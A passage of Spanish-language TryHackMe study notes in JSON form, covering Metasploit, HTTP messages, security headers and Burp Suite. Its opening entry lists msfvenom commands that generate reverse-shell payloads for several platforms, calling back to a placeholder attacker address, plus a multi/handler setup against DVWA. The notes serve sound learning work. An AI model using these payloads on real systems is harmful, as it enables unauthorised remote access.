encodeado.\n\n------------------------\n<h2>Handlers</h2>\nSimilar a los exploits generando una reverse shell, necesitarás ser capaz de aceptar conexiones entrantes generadas por el payload de Msfvenom. Al usar un módulo de explotación todo esto es manejado automáticamente. El término usado para recibir una conexión es \"catching shell\".\n\nExplotaremos una vulnerabilidad presente en DVWA (Damn Vulnerable Web Application), los pasos son:\n\n1. Generar una shell PHP usando MSFvenom.\n2. Lanzar el handler de Metasploit.\n3. Ejecutar la shell PHP.\n\n>[!NOTE] El PHP de salida no tendrá el tag de php inicial ni final, hay que editarlo para que sea válido.\n\nPara usar el multi handler, usaremos el módulo `use exploit/multi/handler`. El multi handler funciona para todos los payloads de Metasploit y puede ser usado para Meterpreter también.\n\nPara usar el módulo, necesitaremos configurar el valor del payload (`php/reverse_php` en este caso), el LHOST y el LPORT.\n\n--------------------\n<h2>Otros payloads</h2>\nBasándonos en la configuración del sistema objetivo, msfvenom puede usarse para crear payloads en casi todos los formatos:\n\n<h5>Linux Executable and Linkable Format (elf)</h5>\n`msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f elf > rev_shell.elf`\n\nEs como el formato `.exe` en Windows.\n\n<h5>Windows</h5>\n`msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f exe > rev_shell.exe`\n<h5>PHP</h5>\n`msfvenom -p php/meterpreter_reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f raw > rev_shell.php`\n<h5>ASP</h5>\n`msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f asp > rev_shell.asp`\n<h5>Python</h5>\n`msfvenom -p cmd/unix/reverse_python LHOST=10.10.X.X LPORT=XXXX -f raw > rev_shell.py`\n\n\nTodos estos ejemplos son payloads reverse."
  },
  {
    "title": "4. Vulnerability Scanning",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/7-exploitation-basics/3-metasploit-exploitation/4-vulnerability-scanning/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/7. Exploitation Basics/3. Metasploit - Exploitation/4. Vulnerability Scanning.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 7. Exploitation Basics > 3. Metasploit - Exploitation",
    "content": "Metasploit te permite identificar rápidamente vulnerabilidades críticas. El término \"low hanging fruit\" (fruta que cuelga bajo) se refiere al tipo de vulnerabilidades que on fácilmente identificables y explotables.\n\nPuedes usar el comando `search` para listar módulos útiles. Puedes usar el comando `info` para obtener más información acerca de como se usa y su propósito."
  },
  {
    "title": "5. HTTP Request - Request Line and Methods",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/8-web-hacking/1-web-application-basics/5-http-request-request-line-and-methods/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/8. Web Hacking/1. Web Application Basics/5. HTTP Request - Request Line and Methods.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 8. Web Hacking > 1. Web Application Basics",
    "content": "Una petición HTTP es lo que un usuario manda a un servidor para interactuar con una aplicación web y hacer que algo pase. Ya que estas peticiones son normalmente el primer punto de contacto entre el usuario y el servidor es muy importante saber bien cómo funcionan.\n\n![[138.png]]\n\nImagina una petición HTTP mostrando las partes clave como el método, ruta y versión. Estos elementos hacen lo básico de cómo se comunican el servidor y el cliente.\n\n-----------------------\n<h2>Request Line</h2>\nLa línea de petición (o start line) es la primera parte de una petición HTTP y le dice al servidor qué tipo de petición es. Tiene tres partes principales: el método HTTP, la ruta URL y la versión HTTP.\n\nEjemplo: `METHOD /path HTTP/version`\n\n<h3>Métodos</h3>\nLos métodos HTTP le dicen al servidor qué acción el usuario quiere llevar a cabo en el recurso identificado por la ruta URL. Aquí unos de los métodos más comunes y utilizados.\n\n------------\n<h6>GET</h6>\nUsado para extraer información del servidor sin hacer cambios. Recuerda exponer sólo información que el usuario pueda ver. Evita poner información sensible como tokens o contraseñas.\n<h6>POST</h6>\nManda información al servidor, usualmente para crear o actualizar algo. Valida y limpia SIEMPRE el contenido para evitar ataques como SQLI y XSS.\n<h6>PUT</h6>\nReemplaza o actualiza algo en el servidor, recuerda validar que el usuario esté autorizado para hacer estos cambios antes de hacerlos.\n<h6>DELETE</h6>\nBorra algo del servidor, recuerda, como con PUT, validar que el usuario tenga los permisos correspondientes para llevar a cabo esta acción.\n\nA parte de los métodos más comunes, aquí otros:\n\n<h6>PATCH</h6>\nActualiza un recurso. Es útil para hacer pequeños cambios sin reemplazar la web entera, pero valida la información aportada para evitar inconsistencias.\n<h6>HEAD</h6>\nFunciona como un GET pero sólo devuelve los headers, útil para comprobar metadata sin descargar el contenido completo.\n<h6>OPTIONS</h6>\nTe dice qué métodos están disponibles para un recurso específico.\n<h6>TRACE</h6>\nSimilar a OPTIONS, te dice qué métodos están disponibles, con propósito de debugging. Muchos servidores lo desactivan por motivos de seguridad.\n<h6>CONNECT</h6>\nUsado para crear una conexión segura, como para HTTPS. No es tan común pero es crítica para la comunicación encriptada.\n\n----------------------\n<h3>Ruta URL</h3>\nLa ruta URL le dice al servidor dónde encontrar el recurso al cual el usuario está intentando acceder. Por ejemplo, en la URL `https://tryhackme.com/api/users/12`, la ruta `/api/users/123` identifica a un usuario específico.\n\nLos atacantes comúnmente intentan manipular la ruta URL para explotar vulnerabilidades, así que es crucial:\n\n- Validar la ruta URL para prevenir acceso no autorizado.\n- Sanitizar la ruta para evitar ataques de inyección.\n- Proteger la información sensible.\n\n-----------------------------\n<h3>Versión HTTP</h3>\nLa versión HTTP muestra la versión del protocolo usada para comunicarse entre el cliente y el servidor. Aquí una vista rápida de los usos más comunes.\n\n<h6>HTTP/0.9 (1991)</h6>\nLa primera versión, solo soportaba GET.\n<h6>HTTP/1.0 (1996)</h6>\nIncrementó headers y mejor soporte para diferente tipo de contenido.\n<h6>HTTP/1.1 (1997)</h6>\nTrajo conexiones persistentes, encoding y mejor cacheo. Ampliamente usado hasta nuestra fecha.\n<h6>HTTP/2 (2015)</h6>\nIntrodujo funcionalidades como multiplexing, compresión de headers y priorización para actuación más rápida.\n<h6>HTTP/3 (2022)</h6>\nConstruido en HTTP/2, pero usa un nuevo protocolo (QUIC) para conexiones más rápidas y seguras.\n\nAunque HTTP/2 y HTTP/3 ofrecen mejor rapidez y seguridad, muchos sistemas todavía usan HTTP/1.1 porque tiene buen soporte y funciona con casi todos los setups existentes. Sin embargo evolucionar hacia HTTP/2 o HTTP/3 puede tener mejoras significativas en términos de eficiencia y seguridad."
  },
  {
    "title": "8. HTTP Response - Headers and Body",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/8-web-hacking/1-web-application-basics/8-http-response-headers-and-body/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/8. Web Hacking/1. Web Application Basics/8. HTTP Response - Headers and Body.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 8. Web Hacking > 1. Web Application Basics",
    "content": "<h2>Headers de Respuesta</h2>\nCuando un servidor web responde a una petición HTTP, incluye los headers de respuesta HTTP, que son pares de llave-valor. Estos, ofrecen información importante sobre la respuesta y le dicen al cliente cómo manejarla.\n\n![[139.jpg]]\n\n------------------\n<h2>Headers de Respuesta Requeridos</h2>\nAlgunos headers de respuesta son cruciales para que la respuesta HTTP funcione correctamente. Dan información esencial que tanto el servidor como el cliente necesitan para procesar todo correctamente. Aquí hay algunos importantes:\n\n- **Date**\n  Ejemplo: `Date: Fri, 23 Aug 2024 10:43:21 GMT`\n  Este header muestra la fecha y hora exactas de la respuesta.\n  \n- **Content-Type**\n  Ejemplo: `Content-Type: text/html; charset=utf-8`\n  Le dice al cliente qué tipo de contenido estará recibiendo. También incluye el set de caracteres ( como UTF-8) para ayudar a mostrarlo correctamente.\n  \n- **Server**\n  Ejemplo: `Server: nginx`\n  Este header muestra qué tipo de software está manejando la petición. Es bueno para hacer debugging, pero también puede revelar información que puede ser útil para los atacantes.\n\n--------------------\n<h2>Otros Headers de Respuesta Comunes</h2>\nA parte de los esenciales, hay otros headers comunes que dan instrucciones adicionales al cliente o al navegador y ayudan a controlar cómo la respuesta debería ser manejada.\n\n- **Set-Cookie**\n  Ejemplo: `Set-Cookie: sessionId=38af1337es7a8`\n  Este manda cookies desde el servidor al cliente, las cuales el cliente almacena y manda de vuelta con peticiones futuras. Para mantenerlas seguras, asegúrate de que están configuradas con las flags `HttpOnly` y `Secure`.\n  \n- **Cache-Control**\n  Ejemplo: `Cache-Control: max-age=600`\n  Este header le dice al cliente cuánto tempo puede almacenar la respuesta antes de tener que comprobar con el servidor de nuevo. También puede hacer que cierta información sensible no se cachee, usando `no-cache`.\n  \n- **Location**\n  Ejemplo: `Location: /index.html`\n  Este se utiliza en las respuestas de redirección (3XX). Le indica al cliente dónde ir después de que el recurso se haya movido.\n\n------------------------\n<h2>Cuerpo de Respuesta</h2>\nEl cuerpo de respuesta HTTP es donde la información real vive, cosas como HTML, JSON, imágenes, etc, que el servidor manda de vuelta al cliente. Para prevenir ataques de inyección, como XSS, sanitiza siempre cualquier información antes de incluirla en la respuesta."
  },
  {
    "title": "7. HTTP Response - Status Line and Status Codes",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/8-web-hacking/1-web-application-basics/7-http-response-status-line-and-status-codes/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/8. Web Hacking/1. Web Application Basics/7. HTTP Response - Status Line and Status Codes.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 8. Web Hacking > 1. Web Application Basics",
    "content": "Cuando interactúas con una aplicación web, el servidor manda una respuesta HTTP para hacerte saber si tu petición fue o no exitosa.Estas respuestas incluyen un código de estado y una breve explicación (llamada frase de razón) que te da una vista de cómo el servidor manejó tu petición.\n\n--------------------\n<h2>Línea de Estado</h2>\nLa primera línea en cada respuesta HTTP se llama línea de estado. Te da tres piezas clave de información:\n\n1. **Versión HTTP:** Esto te dice qué versión de HTTP está siendo usada.\n2. **Código de Estado:** Un número de tres dígitos que muestra el resultado de tu petición.\n3. **Frase de Razón:** Un mensaje corto explicando el código de estado en términos leíbles por un humano.\nYa que ya hemos hablado de las versiones HTTP, nos centraremos ahora en el código de estado y la frase de razón.\n\n-------------------\n<h2>Códigos de Estado y Frases de Razón</h2>\nLos códigos caen en cinco categorías diferentes:\n\n<h6>Respuestas Informativas (100-199)</h6>\nEstos códigos significan que el servidor ha recibido parte de la petición y está esperando el resto. Es una señal de \"continúa\".\n<h6>Restuestas Exitosas (200-299)</h6>\nEstos códigos significan que todo ha funcionado como se esperaba.\n<h6>Restuestas de Redirección (300-399)</h6>\nEstos códigos te dicen que el recurso que has pedido se ha movido a otro sitio, usualmente dándote la nueva URL.\n<h6>Restuestas de Error del Cliente (00-499)</h6>\nEstos códigos indican un problema con la petición. Puede que la URL esté mal, o que te falte información clave, como la autentificación.\n<h6>Restuestas de Error de Servidor (500-599)</h6>\nEstos códigos implican que el servidor encontró un error mientras trataba de cumplir la petición. Usualmente problemas server-side, no la culpa del cliente.\n\n----------------------\n<h2>Códigos de Estado Comunes</h2>\nAquí algunos de los códigos de estado más vistos:\n\n- **100 (Continue):** El servidor recibió la primera parte y está listo para el resto.\n- **200 (OK):** La petición fue exitosa y el servidor está mandando de vuelta el recurso pedido.\n- **301 (Moved Permanently):** El recurso pedido fue movido a una nueva URL. Usa la nueva URL desde ahora.\n- **404 (Not Found):** El servidor no encontró el recurso en la URL proporcionada. Comprueba que tengas la URL correcta.\n- **500 (Internal Server Error):** Algo salió mal del lado del servidor y no pudo procesar tu petición.\n"
  },
  {
    "title": "6. HTTP Request - Headers and Body",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/8-web-hacking/1-web-application-basics/6-http-request-headers-and-body/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/8. Web Hacking/1. Web Application Basics/6. HTTP Request - Headers and Body.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 8. Web Hacking > 1. Web Application Basics",
    "content": "<h2>Headers de la Petición</h2>\nLos headers de las peticiones permiten que información extra sea transmitida al servidor sobre una petición. Algunos headers comunes:\n\n| **Request Header** | **Ejemplo**                                                                      | **Descripción**                                                                       |\n| ------------------ | -------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------- |\n| Host               | `Host: tryhackme.com`                                                            | Especifica el nombre del servidor que pide.                                           |\n| User-Agent         | `User-Agent: Mozilla/5.0`                                                        | Comparte información sobre el navegador que manda la petición.                        |\n| Referer            | `Referer: https://www.google.com/`                                               | Indica la URL desde la que viene la petición.                                         |\n| Cookie             | `Cookie: user_type=student; room=introtowebapplication; room_status=in_progress` | La información que el servidor previamente pidió al navegador se almacena en cookies. |\n| Content-Type       | `Content-Type: application/json`                                                 | Describe qué tipo o formato de información está en la petición.                       |\n\n-----------------------------------------\n<h2>Cuerpo de la Petición</h2>\nEn las peticiones HTTP como POST y PUT, donde la información es mandada al servidor, en vez de al revés, la información está colocada dentro del cuerpo de la petición. El formato de esta información puede tomar varias formas, pero algunas comunes son `URL Encoded`, `Form Data`, `JSON` o `XML`.\n\n- **URL Encoded (applicattion/x-www-form-urlencoded)**\n  Un formato donde la información es estructurada en pares de llave y valor donde (`key = value`). Múltiples parejas separadas por un símbolo `&`, como `key1=value1&key2=value2`. Los caracteres especiales son percent-encoded (por ejemplo `' ' = '%20'`).\n  \n  ```http\nPOST /profile HTTP/1.1\nHost: tryhackme.com\nUser-Agent: Mozilla/5.0\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 33\n\nname=Aleksandra&age=27&country=US\n```\n\n- **Form Data (multipart/form-data)**\n  Permite mandar múltiples bloques de información donde cada uno está separado por una string frontera. Esta es definida en el header. Esta forma puede ser usada para mandar binarios, como cuando se sube una foto al servidor.\n  \n  ```http\nPOST /upload HTTP/1.1\nHost: tryhackme.com\nUser-Agent: Mozilla/5.0\nContent-Type: multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW\n\n----WebKitFormBoundary7MA4YWxkTrZu0gW\nContent-Disposition: form-data; name=\"username\"\n\naleksandra\n----WebKitFormBoundary7MA4YWxkTrZu0gW\nContent-Disposition: form-data; name=\"profile_pic\"; filename=\"aleksandra.jpg\"\nContent-Type: image/jpeg\n\n[Binary Data Here representing the image]\n----WebKitFormBoundary7MA4YWxkTrZu0gW--\n```\n\n- **JSON (application/json)**\n  En este formato, la información puede ser mandada usando la estructura JSON (JavaScript Object Notation). La información está formateada en pares de nombre: valor. Múltiples parejas son separadas por comas, todas contenidas entre `{}`.\n  \n  ```http\nPOST /api/user HTTP/1.1\nHost: tryhackme.com\nUser-Agent: Mozilla/5.0\nContent-Type: application/json\nContent-Length: 62\n\n{\n    \"name\": \"Aleksandra\",\n    \"age\": 27,\n    \"country\": \"US\"\n}\n```\n\n- **XML (application/xml)**\n  En el formato XML, la información se estructura dentro de etiquetas llamadas \"tags\", que tienen una apertura y un cierre. Estas etiquetas pueden ser acomodadas a otras.\n  \n  ```http\nPOST /api/user HTTP/1.1\nHost: tryhackme.com\nUser-Agent: Mozilla/5.0\nContent-Type: application/xml\nContent-Length: 124\n```\n```xml\n<user>\n    <name>Aleksandra</name>\n    <age>27</age>\n    <country>US</country>\n</user>\n```\n\n"
  },
  {
    "title": "4. HTTP Messages",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/8-web-hacking/1-web-application-basics/4-http-messages/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/8. Web Hacking/1. Web Application Basics/4. HTTP Messages.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 8. Web Hacking > 1. Web Application Basics",
    "content": "Los mensajes HTTP son los paquetes de información intercambiados entre un usuario (el cliente) y el servidor web. Estos mensajes son muy importantes para entender cómo las aplicaciones web funcionan porque pueden mostrar cómo se comunican las respuestas.\n\nHay dos tipos de mensajes HTTP:\n\n- **Peticiones HTTP:** Mandadas por el usuario para activar las acciones del servidor web.\n- **Respuestas HTTP:** Mandadas por el servidor en respuesta a la petición del usuario.\n\nCada mensaje sigue un formato específico que ayuda a ambos a comunicarse sin errores.\n\n<h5>Start Line</h5>\nEs como la introducción del mensaje. Nos dice qué tipo de mensaje se va a mandar, ya sea una petición del usuario o una respuesta del servidor. También da información a cerca de cómo debería ser tratado el mensaje.\n\n<h5>Headers</h5>\nLos headers están compuestos de pares de llaves que ofrecen información extra sobre el mensaje HTTP. Dan instrucciones tanto al cliente como al servidor de cómo manejar la petición o la respuesta. Estos headers cubren muchas cosas como la seguridad, tipos de contenido y más.\n\n<h5>Empty Line</h5>\nEs un pequeño divisor que separa el header del cuerpo. Es esencial porque muestra dónde los headers terminan y dónde empieza el verdadero contenido del mensaje.\n\n<h5>Body</h5>\nEs donde el mensaje en sí está almacenado. En una petición, el cuerpo puede incluir información que el usuario quiera mandar al servidor mientras que en la respuesta el servidor incluye la información que el usuario puede ver en función de su solicitud."
  },
  {
    "title": "9. Security Headers",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/8-web-hacking/1-web-application-basics/9-security-headers/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/8. Web Hacking/1. Web Application Basics/9. Security Headers.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 8. Web Hacking > 1. Web Application Basics",
    "content": "<h2>Headers de Seguridad</h2>\nLos headers de seguridad HTTP ayudan a mejorar la seguridad en general de las aplicaciones web ofreciendo mitigaciones frente a ataques como XSS, clickjacking y otros. Nos meteremos más en profundidad con los siguientes:\n\n- Content-Security-Policy (CSP)\n- Strict-Transport-Security (HSTS)\n- X-Content-Type-Options\n- Referrer-Policy\n\nPuedes usar un sitio web como https://securityheaders.io/ para analizar los headers de seguridad de cualquier sitio web.\n\n---------------\n<h2>Content-Security-Policy</h2>\nUn header CSP es una capa adicional de seguridad que puede ayudar a mitigar ataques comunes como Cross-Site Scripting (XSS). Código malicioso podría estar hosteado en una web separada o dominio diferente y ser inyectada. Un CSP permite a los administradores decir qué webs o recursos son seguros.\n\nDentro del propio header puedes ver propiedades como `default-src` o `script-src`. Cada uno de estos parámetros da opciones al administrador para definir varios niveles de seguridad. El uso de `self` es una palabra clave especial que refleja el nombre del mismo dominio desde el que se hostea el sitio web. Viendo un ejemplo:\n\n`Content-Security-Policy: default-src 'self'; script-src 'self' https://cdn.tryhackme.com; style-src 'self'`\n\nVemos el uso de:\n\n- **default-src**\n  Que especifica la política por defecto de self.\n  \n- **script-src**\n  Que especifica la política desde dónde pueden ser cargados los scripts, self y otro dominio.\n  \n- **style-src**\n  Que especifica la política desde dónde se puede cargar el estilo CSS, self en este caso.\n\n-----------------------\n<h2>Strict-Transport-Security (HSTS)</h2>\nEl header HSTS asegura que el navegador web siempre se conectará a través de HTTPS. Veamos un ejemplo:\n\n`Strict-Transport-Security: max-age=63072000; includeSubDomains; preload`\n\nAquí un desglose:\n\n- **max-age**\n  Este es el tiempo de expiración en segundos para este ajuste.\n  \n- **includeSubDomains**\n  Un ajuste opcional que le dice al navegador que aplique este ajuste a todos los subdominios.\n  \n- **preload**\n  Este ajuste opcional permite que el sitio web sea incluido en listas de pre-carga. Los navegadores pueden usarlas para reforzar HSTS.\n\n---------------------\n<h2>X-Content-Type-Options</h2>\nEl header X-Content-Type-Options puede ser usado para indicar al navegador que no debe adivinar el tiempo MIME (Multipurpose Internet Mail Extensions). Aquí un ejemplo:\n\n`X-Content-Type-Options: nosniff`\n\nAquí hay un desglose:\n\n- **nosniff**\n  Esta directiva indica al navegador no esnifar (averiguar) o adivinar el tipo de MIME.\n\n-----------------\n<h2>Referrer-Policy</h2>\nEste header controla la cantidad de información mandada al servidor de destino cuando un usuario es redireccionado desde la fuente, como un hiperlink. El header es capaz de permitir a un administrador web controlar qué información se comparte. Algunos ejemplos: \n\n- `Referrer-Policy: no-referrer`\n- `Referrer-Policy: same-origin`\n- `Referrer-Policy: strict-origin`\n- `Referrer-Policy: strict-origin-when-cross-origin`\n  \nAquí un desglose:\n\n- **no-referrer**\n  Este desactiva que cualquier información sea mandada sobre el referrer.\n  \n- **same-origin**\n  Esta política sólo mandará información del referrer cuando la destinación es parte del origen. Es útil cuando quieres que el referrer se mande cuando el hiperlink está dentro de la misma página pero no hacia otras.\n  \n- **strict-origin**\n  Esta política sólo manda el referrer como el origen cuando el protocolo se mantiene, es decir, que un referrer es mandado cuando una conexión HTTPS es mandada a otra HTTPS.\n  \n- **strict-origin-when-cross-origin**\n  Similar a strict-origin excepto por las peticiones same-origin, donde manda la URL completa en el header origin.\n  \n"
  },
  {
    "title": "1. Introduction",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/8-web-hacking/1-web-application-basics/1-introduction/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/8. Web Hacking/1. Web Application Basics/1. Introduction.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 8. Web Hacking > 1. Web Application Basics",
    "content": "En esta unidad hablaremos de los elementos clave de una aplicación web, como la URL, peticiones y respuestas HTTP y más.\n\n----------\n<h2>Objetivos de Aprendizaje</h2>\nAl completar esta unidad:\n\n- Entenderás qué es y cómo corre en el navegador una aplicación web.\n- Podrás descomponer los componentes de una URL y saber cómo ayudan a acceder a las fuentes.\n- Aprenderás cómo las peticiones y respuestas HTTP funcionan.\n- Te familiarizarás con los diferentes tipos de métodos de petición HTTP.\n- Entenderás qué significan los códigos de respuesta.\n- Verás cómo funcionan los headers HTTP y por qué importan para la seguridad."
  },
  {
    "title": "2. Web Application Overview",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/8-web-hacking/1-web-application-basics/2-web-application-overview/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/8. Web Hacking/1. Web Application Basics/2. Web Application Overview.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 8. Web Hacking > 1. Web Application Basics",
    "content": "Considera la analogía de una aplicación web como un planeta. Los astronautas viajan al planeta para explorar su superficie. Aunque sólo vean la superficie, hay muchas cosas pasando dentro.\n\n--------------\n<h2>Front End</h2>\nEl frontend puede ser considerado la superficie del planeta, las partes que un astronauta puede ver directamente. La web tendría una serie de tecnologías que permitirían al usuario interactuar con ellas, como HTML, CSS y JavaScript.\n\n- **HTML(Hypertext Markup Language):**  Es un aspecto fundamental de las aplicaciones web. Es un conjunto de instrucciones o código que le dice al navegador qué enseñas y cómo hacerlo. Podría ser comparado a simples seres vivos, estos tienen ADN (instrucciones).\n- **CSS (Cascading Style Sheets):** Describe un estándar de apariencia, como ciertos colores, tipos de texto y disposiciones. Esto podría ser comparado a la parte del ADN que describe el color, forma, tamaño o textura del organismo.\n- **JS (JavaScript):** Es una parte del frontend que permite actividad más compleja. En la analogía, JS puede ser considerado el cerebro del organismo.\n\n----------------\n<h2>Back End</h2>\nEl backend de una aplicación web es aquello que no se ve pero que es importante para que funcione bien. En el planeta serían las estructuras, el aire o la gravedad.\n\n- **Database:** Es donde se almacena la información. Una aplicación web puede querer guardar preferencias sobre un visitante. Un planeta puede tener vida inteligente que escribe libros, por ejemplo.\n- **Infraestructura:** Hay muchas como los servidores web, los dispositivos red, la red en sí. En nuestro planeta serían las carreteras, los coches y la gasolina.\n- **WAF (Web Application Firewall):** Es un componente opcional pero que mejora la seguridad. Esto podría ser comparado con la capa de Ozono.\n"
  },
  {
    "title": "0. Web Application Basics",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/8-web-hacking/1-web-application-basics/0-web-application-basics/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/8. Web Hacking/1. Web Application Basics/0. Web Application Basics.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 8. Web Hacking > 1. Web Application Basics",
    "content": "[[THM/0. Pre Career/2. Cyber Security 101/8. Web Hacking/1. Web Application Basics/1. Introduction]]\n[[2. Web Application Overview]]\n[[3. Uniform Resource Locator]]\n[[4. HTTP Messages]]\n[[5. HTTP Request - Request Line and Methods]]\n[[6. HTTP Request - Headers and Body]]\n[[7. HTTP Response - Status Line and Status Codes]]\n[[8. HTTP Response - Headers and Body]]\n[[9. Security Headers]]\n"
  },
  {
    "title": "3. Uniform Resource Locator",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/8-web-hacking/1-web-application-basics/3-uniform-resource-locator/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/8. Web Hacking/1. Web Application Basics/3. Uniform Resource Locator.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 8. Web Hacking > 1. Web Application Basics",
    "content": "Una URL (Uniform Resource Locator) es una dirección web que te permite acceder a todo tipo de contenido online. Guía a tu navegador hasta el recurso en cuestión, sea cual sea.\n\n--------------\n<h2>Anatomía de una URL</h2>\n![[137.png]]Una URL está compuesta de múltiples partes, cada una ayudando a una cosa. Aquí un desglose de los componentes:\n\n<h5>Scheme</h5>\nEs el protocolo usado para acceder a la web. El más común es HTTP/HTTPS, pero existen otros.\n\n<h5>User</h5>\nAlgunas URLs pueden incluir los detalles de inicio de sesión de un usuario. De todas formas es raro verlo hoy en día, no es muy seguro.\n\n<h5>Host/Dominio</h5>\nEs la parte más importante porque te dice a qué sitio web estás accediendo. Cada dominio debe ser único y registrado. **Typosquatting** es la práctica que registra dominios muy parecidos a los originales.\n\n<h5>Port</h5>\nEl número de puerto te redirecciona hacia el puerto donde se está sirviendo la página web, es como decir la puerta, los estándares son 80 para HTTP y 443 para HTTPS.\n\n<h5>Path</h5>\nEl path apunta al archivo o página específica dentro del servidor web.\n\n<h5>Query String</h5>\nEs la parte de la URL que comienza con un \"?\". Es usado comúnmente para buscar por o configurar parámetros.\n\n<h5>Fragment</h5>\nComienza con un \"#\" y ayuda a saltar hacia un sitio específico de la página."
  },
  {
    "title": "13. Proxying HTTPS",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/8-web-hacking/4-burp-suite-the-basics/13-proxying-https/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/8. Web Hacking/4. Burp Suite - The Basics/13. Proxying HTTPS.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 8. Web Hacking > 4. Burp Suite - The Basics",
    "content": "Al interpretar tráfico HTTP, podemos encontrarnos un inconveniente al navegar a sitios con TLS activado. Por ejemplo, al acceder a `https://google.com/`, podemos recibir un error indicando que el Certificado de Autoridad (CA) de PortSwigger no está autorizado para una conexión segura.\n\n![[Pasted image 20251006222056.png]]\n\nPara solucionar este problema, podemos añadir manualmente el CA de PortSwigger a nuestro navegador.\n\n1. **Descargar el certificado CA:** Con el proxy activado ve a `http://burp/cert`. Esto descarga el `cacert.der`.\n2. **Accede a Firefox:** Escribe `about:preferences` en el campo URL y dale a **Enter**. Esto te llevará a la página de ajustes de certificado de Firefox.\n   ![[Pasted image 20251006222519.png]]\n3. **Importa el CA:** En la ventana de manejo de certificados, haz click en **Import**. Selecciona el archivo.\n4. **Configura confianza:** En la siguiente pestaña que aparezca, marca la opción que dice \"Trust this CA to identify websites\" y **OK**.\n   ![[Pasted image 20251006223021.png]]\n\nAhora ya podemos visitar sitios con TLS activado sin tener errores."
  },
  {
    "title": "7. Options",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/8-web-hacking/4-burp-suite-the-basics/7-options/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/8. Web Hacking/4. Burp Suite - The Basics/7. Options.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 8. Web Hacking > 4. Burp Suite - The Basics",
    "content": "Antes de adentrarnos en Burp Proxy, exploremos las opciones disponibles para configurar Burp Suite. Hay dos tipos de ajustes: globales (ajustes de usuario) y de proyecto.\n\n- **Ajustes Globales:** Estos afectan a la instalación entera de Burp Suite y se aplican cada vez que lo inicias. Ofrecen una configuración base para tu entorno de Burp Suite.\n- **Ajustes de Proyecto:** Estos son ajustes específicos del proyecto actual y sólo se aplican durante la sesión, aunque Burp Suite Community no admite guardar proyectos.\n\nPara acceder a los ajustes haz click en **Settings** arriba a la derecha. La ventana de Ajustes se ve así:\n\n![[Pasted image 20251004174038.png]]\n\nEn ella vemos un menú a mano izquierda. Este nos permite cambiar entre diferentes tipos de ajustes, incluyendo:\n\n1. **Search:** Activa la búsqueda de determinados ajustes usando palabras.\n2. **Type filter:** Filtra los ajustes para las opciones **User** y **Project**.\n\t- **User:**  Muestra los ajustes que afectan a todo Burp Suite.\n\t- **Project :** Muestra los ajustes específicos de cada proyecto.\n3. **Categories:** Permite seleccionar ajustes por categoría.\n\n>[!NOTE] Muchas herramientas en Burp Suite ofrecen atajos a determinadas categorías de ajustes. Por ejemplo el módulo **Proxy** incluye un botón directo a **Proxy Settings**.\n\n"
  },
  {
    "title": "12. Scoping and Targeting",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/8-web-hacking/4-burp-suite-the-basics/12-scoping-and-targeting/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/8. Web Hacking/4. Burp Suite - The Basics/12. Scoping and Targeting.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 8. Web Hacking > 4. Burp Suite - The Basics",
